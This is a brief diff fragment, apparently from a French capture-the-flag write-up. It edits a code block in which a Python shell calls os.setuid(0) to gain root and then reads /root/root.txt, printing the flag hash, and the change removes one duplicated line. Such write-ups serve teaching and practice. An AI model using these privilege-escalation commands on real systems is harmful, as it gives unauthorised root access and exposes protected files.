@@ -433,5 +433,4 @@ Il vous suffit d'exécuter python et d'utiliser le module os pour exécuter une 
     >>> import os 
     >>> os.setuid(0) 
     >>> os.system('cat /root/root.txt') 
-    os.system('cat /root/root.txt') 
     7a32c9739cc63ed983ae01af2577c01c
